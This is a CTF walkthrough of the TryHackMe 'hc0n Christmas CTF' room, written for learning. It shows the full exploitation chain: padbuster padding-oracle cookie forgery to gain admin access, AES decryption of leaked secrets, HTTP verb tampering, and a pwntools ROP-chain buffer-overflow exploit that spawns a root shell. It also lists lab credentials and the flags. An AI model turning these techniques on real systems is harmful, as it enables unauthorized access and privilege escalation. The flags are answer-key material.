# hc0n Christmas CTF

Room: https://tryhackme.com/room/hc0nchristmasctf

Honestly one of the harder boxes I have done on THM. Every technique clicked eventually, but nothing came easy. I hit dead ends, wrong assumptions, and had to backtrack more than once. Ended up being one of those challenges that's genuinely satisfying once root pops, because you know you earned it.

## recon

started with a full port scan.

```
nmap -sC -sV -p- -T4 <target IP>
```

![nmap scan](../Screenshots/hc0n%20Christmas%20CTF/01-nmap-scan.png)

Three ports open
>  22
>  80
>  8080

## poking the website

ran gobuster against port 80 to see what's actually there.

```
gobuster dir -u http://<target IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
```

![gobuster](../Screenshots/hc0n%20Christmas%20CTF/03-gobuster-dirscan.png)

got `login.php`, `register.php`, an `/admin` dir, and a `robots.txt`. checked robots.txt first since it's free info.

```
curl http://<target IP>/robots.txt
```

![robots.txt](../Screenshots/hc0n%20Christmas%20CTF/02-robots-txt.png)

jackpot. it names the admin username straight up `administratorhc0nwithyhackme` and points at `iv.png`.

## the admin apk (dead end, but worth checking)

`/admin/` had an apk sitting there in a directory listing. pulled it down and ran it through jadx.

```
jadx -d java_sources app-release.apk
```

inside, the app's `enc()`/`dec()` methods confirm it's using `AES/CBC/PKCS5Padding`.

## padding oracle on the login cookie

registered an account, logged in, grabbed the `hcon` session cookie from devtools.

```
hcon = tWFjhrztc6CU%2BaQt4b%2FHzuN7JHhIAM65
```

decoded that's 24 bytes, so 8-byte blocks.

checked for an oracle first before committing to a full padbuster run tampering with the last byte of the cookie changed the response size massively (1488 bytes valid vs 15 bytes tampered), so yeah, there's a real oracle here.

ran padbuster to decrypt the cookie and confirm what we're working with:

```
padbuster http://<target IP>/login.php tWFjhrztc6CU%2BaQt4b%2FHzuN7JHhIAM65 8 --cookies "hcon=tWFjhrztc6CU%2BaQt4b%2FHzuN7JHhIAM65" --encoding 0
```

![padbuster decrypt](../Screenshots/hc0n%20Christmas%20CTF/08-padbuster-decrypt-cookie.png)

decrypts to `user=verox` my own username, so the cookie format is confirmed as `user=<name>`. now forge one for the admin account using the same oracle in encrypt mode:

```
padbuster http://<target IP>/login.php tWFjhrztc6CU%2BaQt4b%2FHzuN7JHhIAM65 8 --cookies "hcon=tWFjhrztc6CU%2BaQt4b%2FHzuN7JHhIAM65" --encoding 0 -plaintext user=administratorhc0nwithyhackme
```

![padbuster forge admin cookie](../Screenshots/hc0n%20Christmas%20CTF/09-padbuster-forge-admin-cookie.png)

got a forged ciphertext back. dropped it into the `hcon` cookie value in the browser and hit the homepage.

![admin auth + secret key leak](../Screenshots/hc0n%20Christmas%20CTF/10-admin-page-secret-key-leak.png)

logged in as `administratorhc0nwithyhackme`, and the page straight up prints the AES key: `hconkwith******`. padding oracle fully paid off.

## the runes

back to `iv.png` from robots.txt.

![iv runes](../Screenshots/hc0n%20Christmas%20CTF/05-iv-runes.png)

11 glyphs, cicada 3301 style Gematria Primus runes. matched each one against the chart by hand, got:

```
THEIVFORINGEOAEY
```

16 characters, clean AES-128 IV length, lines up with the 16-char key from the admin leak. good sign it's right.

## decrypting port 8080

now had all three pieces: key `hconkwithyhackme`, IV `THEIVFORINGEOAEY`, and the ciphertext from port 8080 (`RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=`).

![port 8080 ciphertext](../Screenshots/hc0n%20Christmas%20CTF/11-port8080-ciphertext.png)

decrypted straight from the terminal with openssl, no online tools:

```
echo "RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=" | base64 -d | openssl enc -aes-128-cbc -d -K $(echo -n "hconkwithyhackme" | xxd -p) -iv $(echo -n "THEIVFORINGEOAEY" | xxd -p) -nopad
```

output: `user ssh <3 thedarktangent`

so the ssh username is `thedarktangent`.

## password part 1 — http verb tampering

still had `/hide-folders/` from the gobuster run, with two subdirs inside.

![hide-folders listing](../Screenshots/hc0n%20Christmas%20CTF/12-hide-folders-listing.png)

`/hide-folders/1/` returns 405 on a normal GET.

![405 method not allowed](../Screenshots/hc0n%20Christmas%20CTF/13-hide-folders-405.png)

swapped the verb to OPTIONS instead:

```
curl -s -X OPTIONS http://<target IP>/hide-folders/1/
```

response came back with: `hax0r :3 you win firts part of the ssh password` and the password chunk — `Gf7MRr55`.

## password part 2 — reversing the binary

`/hide-folders/2/` had a file called `hola`, 8.6K.

![hola binary](../Screenshots/hc0n%20Christmas%20CTF/15-hola-binary-download.png)

```
curl -O http://<target IP>/hide-folders/2/hola
file hola
```

confirmed ELF 64-bit, not stripped. ran `strings` first looking for a hardcoded password, came up empty — the check isn't a plain string comparison. went straight to `ltrace` instead of firing up a full disassembler:

```
chmod +x ./hola
ltrace -s 100 ./hola
```

typed in a throwaway username/password (`stuxnet` / `aaa`) and watched the trace:

![ltrace password reveal](../Screenshots/hc0n%20Christmas%20CTF/14-ltrace-password-part2.png)

`strcmp("aaa", "n$@#PDuliL")` — there's the real password sitting right in the trace. way faster than digging through a disassembler by hand.

## user flag

ssh'd in with `thedarktangent` and the combined password `Gf7MRr55n$@#PDuliL`.

```
ssh thedarktangent@<target IP>
```

![ssh login](../Screenshots/hc0n%20Christmas%20CTF/16-ssh-login-thedarktangent.png)

```
cat user.txt
```

![user flag](../Screenshots/hc0n%20Christmas%20CTF/17-user-flag.png)

**user flag: `thm{hc0n_christmas_2019!!!}`**

## privesc — suid binary

`ls -la` in the home dir shows a SUID binary owned by root:

```
-rwsrwsr-x 1 root root 8952 Dec 10 2019 hc0n
```

pulled it down to my kali box to reverse it properly (scp was acting up on this box for some reason, so grabbed it over base64 through the ssh session instead):

```
ssh thedarktangent@<target IP> "base64 /home/thedarktangent/hc0n" > hc0n.b64
base64 -d hc0n.b64 > hc0n
chmod +x hc0n
```

### finding the offset

threw 200 `A`s at it to check for a crash:

```
python3 -c "print('A'*200)" > A.in
gdb -q ./hc0n
r < A.in
```

RBP got overwritten with `0x4141414141414141`, straight SIGSEGV. confirmed exploitable.

used a cyclic pattern instead of guessing offsets manually:

```
r < <(python3 -c "import sys; sys.stdout.buffer.write(__import__('subprocess').check_output(['cyclic','200']))")
```

crash landed with RBP = `maaanaaa`. ran it through pwntools' offset lookup:

```
pwn cyclic -l maaanaaa
```

![cyclic offset](../Screenshots/hc0n%20Christmas%20CTF/22-cyclic-offset-48.png)

offset is 48. add 8 bytes for the saved return address on 64-bit, so 56 bytes of junk before we control RIP.

### confirming RIP control

```
python3 -c "
import sys
payload = b'A'*56 + b'\x43\x43\x42\x42\xfe\xfe\xff\xff'
sys.stdout.buffer.write(payload)
" > payload.in
gdb -q ./hc0n
r < payload.in
```

![rip control confirmed](../Screenshots/hc0n%20Christmas%20CTF/23-rip-control-confirmed.png)

`RIP = 0xfffffefe42424343` — exactly the bytes planted. full control at offset 56, confirmed.

### building the rop chain

pulled gadgets with ROPgadget:

```
ROPgadget --binary hc0n --string '/bin/sh'
ROPgadget --binary hc0n --only 'pop|ret'
ROPgadget --binary hc0n --only 'syscall'
```

got everything needed for an `execve("/bin/sh", NULL, NULL)`:

```
/bin/sh string : 0x4006f8
pop rax ; ret  : 0x40061f
pop rdi ; ret  : 0x400604
pop rsi ; ret  : 0x40060d
pop rdx ; ret  : 0x400616
syscall        : 0x4005fa
```

wrote the exploit with pwntools, connects over ssh, runs the suid binary remotely, sends the rop chain:

```python
from pwn import *

HOST = "<target IP>"
PORT = 22

def exploit(r):
    pop_rax = 0x40061f
    pop_rdi = 0x400604
    pop_rsi = 0x40060d
    pop_rdx = 0x400616
    bin_sh  = 0x4006f8
    syscall = 0x4005fa

    payload  = b"A" * 56
    payload += p64(pop_rax)
    payload += p64(59)          # execve syscall number
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(pop_rsi)
    payload += p64(0x0)
    payload += p64(pop_rdx)
    payload += p64(0x0)
    payload += p64(syscall)

    print(r.recvline())
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    r = ssh(host=HOST, port=PORT, user="thedarktangent", password="Gf7MRr55n$@#PDuliL")
    s = r.run("./hc0n")
    exploit(s)
```

ran it:

```
python3 exploit.py
```

![exploit landing root shell](../Screenshots/hc0n%20Christmas%20CTF/24-exploit-root-shell.png)

dropped into a `#` prompt. checked it wasn't just cosmetic:

```
id
whoami
cat /root/root.txt
```

![root flag](../Screenshots/hc0n%20Christmas%20CTF/25-root-flag.png)

`uid=0(root)` confirmed, and the flag's right there.

**root flag: `thm{3xplo1t_my_m1nd}`**

## wrap up

full chain start to finish: recon → padding oracle to forge an admin cookie → AES key leak → rune cipher for the IV → AES-CBC decrypt for the ssh username → HTTP verb tampering for password part 1 → `ltrace` for password part 2 → user shell → SUID binary with a classic offset-56 buffer overflow → SROP-style ROP chain for `execve("/bin/sh")` → root.

good box, lot of different skills touched in one go.
